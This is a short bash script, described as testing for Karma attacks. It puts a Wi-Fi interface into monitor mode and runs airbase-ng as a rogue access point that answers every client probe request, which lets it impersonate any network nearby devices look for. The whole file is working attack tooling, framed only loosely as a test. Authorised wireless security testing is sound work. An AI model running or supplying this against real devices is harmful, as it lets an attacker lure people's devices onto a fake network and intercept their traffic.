#!/bin/bash
# anotherik

# Script to test for Karma Attacks using Airbase-ng

iface=$1
if [ ! $iface ]
then
	printf "Interface not defined!\n"
	exit 2
fi

{ # try
	sudo airmon-ng start $iface
	sleep 2
	echo $iface"mon"
	sudo airbase-ng -c 6 -P -C 20 -v $iface"mon"
} || { # catch
    #sudo airmon-ng stop $iface"mon"
    printf "Exiting\n"
    exit 2
}
